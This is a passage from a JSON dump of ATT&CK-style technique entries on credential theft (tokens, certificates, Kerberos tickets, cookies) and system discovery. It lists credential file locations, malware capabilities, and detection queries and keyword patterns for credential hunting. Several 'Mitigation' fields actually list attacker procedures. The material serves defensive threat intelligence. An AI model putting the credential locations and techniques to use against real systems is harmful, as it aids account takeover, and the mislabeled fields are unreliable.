    "Description": "Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).[1] OAuth is one commonly implemented framework that issues tokens to users for access to systems. Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.In Kubernetes environments, processes running inside a container communicate with the Kubernetes API server using service account tokens. If a container is compromised, an attacker may be able to steal the container’s token and thereby gain access to Kubernetes API commands.[2]Token theft can also occur through social engineering, in which case user action may be required to grant access. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.[3][4] An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.[5][6] The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.[7] Then, they can send a Spearphishing Link to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through Application Access Token.[8]Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens[9], allowing them to obtain new access tokens without prompting the user.",
    "Mitigation": [
      {
        "id": "S0677",
        "name": "AADInternals",
        "description": "AADInternals can steal users’ access tokens via phishing emails containing malicious links.[10]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used several malicious applications to steal user OAuth access tokens including applications masquerading as \"Google Defender\" \"Google Email Protection,\" and \"Google Scanner\" for Gmail users. They also targeted Yahoo users with applications masquerading as \"Delivery Service\" and \"McAfee Email Protection\".[6]"
      },
      {
        "id": "S0683",
        "name": "Peirates",
        "description": "Peirates gathers Kubernetes service account tokens using a variety of techniques.[11]"
      }
    ],
    "Detection": [
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Modification",
        "detects": "Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a \"High severity app permissions\" policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.Security analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app’s purpose, or apps with old \"Last authorized\" fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.Administrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access."
      }
    ],
    "Subtechniques": "\nCredential Access"
  },
  {
    "Title": "Steal or Forge Authentication Certificates",
    "Code": "T1649",
    "Description": "Adversaries may steal or forge certificates used for authentication to access remote systems or resources. Digital certificates are often used to sign and encrypt messages and/or files. Certificates are also used as authentication material. For example, Azure AD device certificates and Active Directory Certificate Services (AD CS) certificates bind to an identity and can be used as credentials for domain accounts.[1][2]Authentication certificates can be both stolen and forged. For example, AD CS certificates can be stolen from encrypted storage (in the Registry or files)[3], misplaced certificate files (i.e. Unsecured Credentials), or directly from the Windows certificate store via various crypto APIs.[4][5][6] With appropriate enrollment rights, users and/or machines within a domain can also request and/or manually renew certificates from enterprise certificate authorities (CA). This enrollment process defines various settings and permissions associated with the certificate. Of note, the certificate’s extended key usage (EKU) values define signing, encryption, and authentication use cases, while the certificate’s subject alternative name (SAN) values define the certificate owner’s alternate names.[7]Abusing certificates for authentication credentials may enable other behaviors such as Lateral Movement. Certificate-related misconfigurations may also enable opportunities for Privilege Escalation, by way of allowing users to impersonate or assume privileged accounts or permissions via the identities (SANs) associated with a certificate. These abuses may also enable Persistence via stealing or forging certificates that can be used as Valid Accounts for the duration of the certificate's validity, despite user password resets. Authentication certificates can also be stolen and forged for machine accounts.Adversaries who have access to root (or subordinate) CA certificate private keys (or mechanisms protecting/managing these keys) may also establish Persistence by forging arbitrary authentication certificates for the victim domain (known as \"golden\" certificates).[7] Adversaries may also target certificates and related services in order to access other forms of credentials, such as Golden Ticket ticket-granting tickets (TGT) or NTLM plaintext.[7]",
    "Mitigation": [
      {
        "id": "S0677",
        "name": "AADInternals",
        "description": "AADInternals can create and export various authentication certificates, including those associated with Azure AD joined/registered devices.[8]"
      },
      {
        "id": "G0016",
        "name": "APT29",
        "description": "APT29 has abused misconfigured AD CS certificate templates to impersonate admin users and create additional authentication certificates.[9]"
      },
      {
        "id": "S0002",
        "name": "Mimikatz",
        "description": "Mimikatz's CRYPTO module can create and export various types of authentication certificates.[10]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Credential Request",
        "detects": "Monitor AD CS certificate requests (ex: EID 4886) as well as issued certificates (ex: EID 4887) for abnormal activity, including unexpected certificate enrollments and signs of abuse within certificate attributes (such as abusable EKUs).[4]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Active Directory Object Modification",
        "detects": "Monitor for changes to CA attributes and settings, such as AD CS certificate template modifications (ex: EID 4899/4900 once a potentially malicious certificate is enrolled).[4]"
      },
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Ensure CA audit logs are enabled and monitor these services for signs of abuse.[4]"
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor for the execution of commands and other utilities abused to forge and/or steal certificates and related private keys.[4]"
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for attempts to access files that store information about certificates and their associated private keys. For example, personal certificates for users may be stored on disk in folders such as %APPDATA%\\Microsoft\\SystemCertificates\\My\\Certificates\\.[4][1]"
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor certificate-based authentication events, such as EID 4768 when an AD CS certificate is used for Kerberos authentication (especially those that don’t correspond to legitimately issued certificates) or when Secure Channel (Schannel, associated with SSL/TLS) is highlighted as the Logon Process associated with an EID 4624 logon event.[4]"
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Access",
        "detects": "Monitor for attempts to access information stored in the Registry about certificates and their associated private keys. For example, user certificates are commonly stored under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\SystemCertificates.[4][1]"
      }
    ],
    "Subtechniques": "\nCredential Access"
  },
  {
    "Title": "Steal or Forge Kerberos Tickets",
    "Code": "T1558",
    "Description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket. Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \"realms\", there are three basic participants: client, service, and Key Distribution Center (KDC).[1] Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.On Windows, the built-in klist utility can be used to list and analyze cached Kerberos tickets.[2]Linux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.[3] On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in /var/lib/sss/secrets/secrets.ldb as well as the corresponding key located in /var/lib/sss/secrets/.secrets.mkey. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for Pass the Ticket. The ccache file may also be converted into a Windows format using tools such as Kekeo.[4][5][6]Kerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the /etc/krb5.conf configuration file and the KRB5CCNAME environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using kinit, klist, ktutil, and kcc built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.[7][8]",
    "Mitigation": [
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": "For containing the impact of a previously generated golden ticket, reset the built-in KRBTGT account password twice, which will invalidate any existing golden tickets that have been created with the KRBTGT hash and other Kerberos tickets derived from it. For each domain, change the KRBTGT account password once, force replication, and then change the password a second time. Consider rotating the KRBTGT account password every 180 days.[9]"
      },
      {
        "id": "M1041",
        "name": "Encrypt Sensitive Information",
        "description": "Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.[10]"
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": "Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire.[10] Also consider using Group Managed Service Accounts or another third party product such as password vaulting.[10]"
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": "Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts.Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators.[10]"
      }
    ],
    "Detection": [
      {
        "id": "DS0026",
        "dsource": "Active Directory",
        "dcomp": "Active Directory Credential Request",
        "detects": "Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within ticket granting tickets (TGTs), and ticket granting service (TGS) requests without preceding TGT requests.[11][12][13]Monitor the lifetime of TGT tickets for values that differ from the default domain duration.[14] Monitor for indications of Pass the Ticket being used to move laterally."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable Pass the Ticket."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for unexpected processes interacting with lsass.exe.[15] Common credential dumpers such as  Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored. Monitor for unusual processes accessing secrets.ldb and .secrets.mkey located in /var/lib/sss/secrets/."
      },
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Metadata",
        "detects": "Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]).[16] [10]"
      }
    ],
    "Subtechniques": [
      {
        "id": "T1558.001",
        "name": "Golden Ticket"
      },
      {
        "id": "T1558.002",
        "name": "Silver Ticket"
      },
      {
        "id": "T1558.003",
        "name": "Kerberoasting"
      },
      {
        "id": "T1558.004",
        "name": "AS-REP Roasting"
      }
    ],
    "Tactic": "\nCredential Access"
  },
  {
    "Title": "Steal Web Session Cookie",
    "Code": "T1539",
    "Description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.[1]There are several examples of malware targeting cookies from web browsers on the local system.[2][3] There are also open source frameworks such as Evilginx2 and Muraena that can gather session cookies through a malicious proxy (ex: Adversary-in-the-Middle) that can be set up by an adversary and used in phishing campaigns.[4][5]After an adversary acquires a valid cookie, they can then perform a Web Session Cookie technique to login to the corresponding web application.",
    "Mitigation": [
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT can harvest cookies from Internet Explorer, Edge, Chrome, and Naver Whale browsers.[6]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes has used a script that extracts the web session cookie and sends it to the C2 server.[7]"
      },
      {
        "id": "S0492",
        "name": "CookieMiner",
        "description": "CookieMiner can steal Google Chrome and Apple Safari browser cookies from the victim’s machine. [8]"
      },
      {
        "id": "S0568",
        "name": "EVILNUM",
        "description": "EVILNUM can harvest cookies and upload them to the C2 server.[9]"
      },
      {
        "id": "G0120",
        "name": "Evilnum",
        "description": "Evilnum can steal cookies and session information from browsers.[10]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can steal the victim's cookies to use for duplicating the active session from another device.[11]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has used an unnamed post-exploitation tool to steal cookies from the Chrome browser.[12]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot has the ability to capture web session cookies.[13][14]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 stole Chrome browser cookies by copying the Chrome profile directories of targeted users.[15]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to steal web session cookies from Internet Explorer, Netscape Navigator, FireFox and RealNetworks applications.[2]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET uses scp to access the ~/Library/Cookies/Cookies.binarycookies file.[16]"
      }
    ],
    "Detection": [
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for an attempt by a user to gain access to a network or computing resource, often by providing credentials to cloud service management consoles. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Access",
        "detects": "Monitor for attempts by programs to inject into or dump browser process memory."
      }
    ],
    "Subtechniques": "\nCredential Access"
  },
  {
    "Title": "Unsecured Credentials",
    "Code": "T1552",
    "Description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials. These credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. Bash History), operating system or application-specific repositories (e.g. Credentials in Registry), or other specialized files/artifacts (e.g. Private Keys).",
    "Mitigation": [
      {
        "id": "S0373",
        "name": "Astaroth",
        "description": "Astaroth uses an external software known as NetPass to recover passwords. [1]"
      },
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can search for sensitive data: for example, in Code Build environment variables, EC2 user data, and Cloud Formation templates.[2]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor application logs for activity that may highlight malicious attempts to access application data, especially abnormal search activity targeting passwords and other artifacts related to credentials.[7]"
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See Valid Accounts for more information."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior. Monitoring when the user's .bash_history is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like \"history\" instead of commands like cat ~/.bash_history."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor newly executed processes that may search compromised systems to find and obtain insecurely stored credentials."
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Monitor for an attempt by a user to gain access to a network or computing resource, often by providing credentials that may search compromised systems to find and obtain insecurely stored credentials."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Access",
        "detects": "Monitor for unexpected windows registry key being accessed that may search compromised systems to find and obtain insecurely stored credentials."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1552.001",
        "name": "Credentials In Files"
      },
      {
        "id": "T1552.002",
        "name": "Credentials in Registry"
      },
      {
        "id": "T1552.003",
        "name": "Bash History"
      },
      {
        "id": "T1552.004",
        "name": "Private Keys"
      },
      {
        "id": "T1552.005",
        "name": "Cloud Instance Metadata API"
      },
      {
        "id": "T1552.006",
        "name": "Group Policy Preferences"
      },
      {
        "id": "T1552.007",
        "name": "Container API"
      },
      {
        "id": "T1552.008",
        "name": "Chat Messages"
      }
    ],
    "Tactic": "\nCredential Access"
  },
  {
    "Title": "Account Discovery",
    "Code": "T1087",
    "Description": "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., Valid Accounts).Adversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.For examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default PowerShell and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system’s files.",
    "Mitigation": [
      {
        "id": "G1016",
        "name": "FIN13",
        "description": "FIN13 has enumerated all users and their roles from a victim's main treasury system.[1]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter listed all non-privileged and privileged accounts available on the machine.[2]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 obtained a list of users and their roles from an Exchange server using Get-ManagementRoleAssignment.[3]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can identify administrator accounts on an infected machine.[4]"
      },
      {
        "id": "S0658",
        "name": "XCSSET",
        "description": "XCSSET attempts to discover accounts from various locations such as a user's Evernote, AppleID, Telegram, Skype, and WeChat data.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor logs and other sources of command execution history for actions that could be taken to gather information about accounts, including the use of calls to cloud APIs that perform account discovery.System and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor access to file resources that contain local accounts and groups information such as /etc/passwd, /Users directories, and the SAM database. If access requires high privileges, look for non-admin objects (such as users or processes) attempting to access restricted file resources."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for processes that can be used to enumerate user accounts and groups such as net.exe and net1.exe, especially when executed in quick succession.[7] Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1087.001",
        "name": "Local Account"
      },
      {
        "id": "T1087.002",
        "name": "Domain Account"
      },
      {
        "id": "T1087.003",
        "name": "Email Account"
      },
      {
        "id": "T1087.004",
        "name": "Cloud Account"
      }
    ],
    "Tactic": "\nDiscovery"
  },
  {
    "Title": "Application Window Discovery",
    "Code": "T1010",
    "Description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.[1] For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.[2]Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
    "Mitigation": [
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to identify the titles of running windows on a compromised host.[3]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor can obtain application window titles and then determines which windows to perform Screen Capture on.[4]"
      },
      {
        "id": "S0454",
        "name": "Cadelspy",
        "description": "Cadelspy has the ability to identify open windows on the compromised host.[5]"
      },
      {
        "id": "S0261",
        "name": "Catchamas",
        "description": "Catchamas obtains application windows titles and then determines which windows to perform Screen Capture on.[6]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman reports window names along with keylogger information to provide application context.[1]"
      },
      {
        "id": "S0038",
        "name": "Duqu",
        "description": "The discovery modules used with Duqu can collect information on open windows.[7]"
      },
      {
        "id": "S0696",
        "name": "Flagpro",
        "description": "Flagpro can check the name of the window displayed on the system.[8]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream has the ability to discover application windows via execution of EnumWindows.[9]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can identify installed security tools based on window names.[2]"
      },
      {
        "id": "G1001",
        "name": "HEXANE",
        "description": "HEXANE has used a PowerShell-based keylogging tool to capture the window title.[10]"
      },
      {
        "id": "S0431",
        "name": "HotCroissant",
        "description": "HotCroissant has the ability to list the names of all open windows on the infected host.[11]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can enumerate windows and child windows on a compromised host.[12][13]"
      },
      {
        "id": "S0265",
        "name": "Kazuar",
        "description": "Kazuar gathers information about opened windows.[14]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group malware IndiaIndia obtains and sends to its C2 server the title of the window for each running process. The KilaAlfa keylogger also reports the title of the window in the foreground.[15][16][17]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete saves the window names.[18]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo can enumerate all windows on the victim’s machine.[19][20]"
      },
      {
        "id": "S0033",
        "name": "NetTraveler",
        "description": "NetTraveler reports window names along with keylogger information to provide application context.[21]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can discover and close windows on controlled systems.[22]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub can use GetForegroundWindow to enumerate the active window.[23]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT gathers information about opened windows during the initial infection.[24]"
      },
      {
        "id": "S0435",
        "name": "PLEAD",
        "description": "PLEAD has the ability to list open windows on the compromised host.[25][25]"
      },
      {
        "id": "S0012",
        "name": "PoisonIvy",
        "description": "PoisonIvy captures window titles.[26]"
      },
      {
        "id": "S0139",
        "name": "PowerDuke",
        "description": "PowerDuke has a command to get text of the current foreground window.[27]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot has the ability to enumerate windows on a compromised host.[28]"
      },
      {
        "id": "S0375",
        "name": "Remexi",
        "description": "Remexi has a command to capture active windows on the machine and retrieve window titles.[29]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can use  the GetForegroundWindow and GetWindowText APIs to discover where the user is typing.[30]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can enumerate the active Window during keylogging through execution of GetActiveWindowTitle.[31]"
      },
      {
        "id": "S0157",
        "name": "SOUNDBITE",
        "description": "SOUNDBITE is capable of enumerating application windows.[32]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can monitor the titles of open windows to identify specific keywords.[33]"
      },
      {
        "id": "S0219",
        "name": "WINERACK",
        "description": "WINERACK can enumerate active windows.[34]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that could be taken to gather system and network information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.Note: Commands can also be obtained from Payload event field for PowerShell event id 4103. For PowerShell Module logging event id 4103, enable logging for module Microsoft.PowerShell.Management. Analytic 1 - Suspicious Commands  suspicious_commands = filter commands where event_id == \"4103\" AND  ((command_line LIKE '%Get-Process%' AND command_line_parameter LIKE '%mainWindowTitle%'))"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls (such as GetForegroundWindow()) that may attempt to get a listing of open application windows. GetForegroundWindow api returns a handle to the foreground window (the window with which the user is currently working). Other API calls relevant to Local Group discovery include  GetProcesses and GetForegroundWindow. GetProcesses api returns an array of type Process that represents all the process resources running on the local computer.Note: Most EDR tools do not support direct monitoring of API calls due to the sheer volume of calls produced by an endpoint but may have alerts or events that are based on abstractions of OS API calls. Dynamic malware analysis tools (i.e., sandboxes) can be used to trace the execution, including OS API calls, for a single PE binary.  Analytic 1 - Suspicious API Calls suspicious_apis = filter processes where ApiName LIKE '%GetProcesses%' OR ApiName LIKE '%GetForegroundWindow%'"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may attempt to get a listing of open application windows. System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Note: Event IDs are for Sysmon (Event ID 1 - process create) and Windows Security Log (Event ID 4688 - a new process has been created). Analytic 1 - Suspicious Processes suspicious_processes = filter process where   (event_id == \"1\" OR event_id == \"4688\") AND  (command_line LIKE '%Get-Process%' AND command_line LIKE '%mainWindowTitle%')"
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Browser Information Discovery",
    "Code": "T1217",
    "Description": "Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.[1]Browser information may also highlight additional targets after an adversary has access to valid credentials, especially Credentials In Files associated with logins cached by a browser.Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., %APPDATA%/Google/Chrome).[2]",
    "Mitigation": [
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 has collected browser bookmark information to learn more about compromised hosts, obtain personal information about users, and acquire details about internal network resources.[3]"
      },
      {
        "id": "S0274",
        "name": "Calisto",
        "description": "Calisto collects information on bookmarks from Google Chrome.[4]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has used type \\\\c$\\Users\\\\Favorites\\Links\\Bookmarks bar\\Imported From IE*citrix* for bookmark discovery.[5]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can retrieve browser history.[6]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack can retrieve browser history.[7][8]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire has the ability to gather browser data such as bookmarks and visited sites.[9]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has used Google Chrome bookmarks to identify internal resources and assets.[10]"
      },
      {
        "id": "S0681",
        "name": "Lizar",
        "description": "Lizar can retrieve browser history and database files.[11][12]"
      },
      {
        "id": "S0409",
        "name": "Machete",
        "description": "Machete retrieves the user profile data (e.g., browsers) from Chrome and Firefox browsers.[13]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can collect the contents of the %USERPROFILE%\\AppData\\Local\\Google\\Chrome\\User Data\\LocalState file.[14]"
      },
      {
        "id": "S0079",
        "name": "MobileOrder",
        "description": "MobileOrder has a command to upload to its C2 server victim browser bookmarks.[15]"
      },
      {
        "id": "S1012",
        "name": "PowerLess",
        "description": "PowerLess has a browser info stealer module that can read Chrome and Edge browser database files.[16]"
      },
      {
        "id": "S1042",
        "name": "SUGARDUMP",
        "description": "SUGARDUMP has collected browser bookmark and history information.[17]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that could be taken to gather browser information, such as local files and databases (e.g., %APPDATA%/Google/Chrome).[2] Remote access tools with built-in features may interact directly using APIs to gather information. Information may also be acquired through system management tools such as Windows Management Instrumentation and PowerShell."
      },
      {
        "id": "DS0022",
        "dsource": "File",
        "dcomp": "File Access",
        "detects": "Monitor for unusual access to stored browser data, such as local files and databases (e.g., %APPDATA%/Google/Chrome).[2] Rather than viewing these events in isolation, this activity may highlight a chain of behavior that could lead to other activities, such as Collection and Exfiltration."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "Process Creation",
        "detects": "Monitor for processes with arguments that may be associated with gathering browser information, such as local files and databases (e.g., %APPDATA%/Google/Chrome).[2]"
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Cloud Infrastructure Discovery",
    "Code": "T1580",
    "Description": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides a DescribeInstances API within the Amazon EC2 API that can return information about one or more instances within an account, the ListBuckets API that returns a list of all buckets owned by the authenticated sender of the request, the HeadBucket API to determine a bucket’s existence along with access permissions of the request sender, or the GetPublicAccessBlock API to retrieve access block configuration for a bucket.[1][2][3][4] Similarly, GCP's Cloud SDK CLI provides the gcloud compute instances list command to list all Google Compute Engine instances in a project [5], and Azure's CLI command az vm list lists details of virtual machines.[6] In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure through Wordlist Scanning.[7]An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.[8] The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.[9]An adversary may also use this information to change the 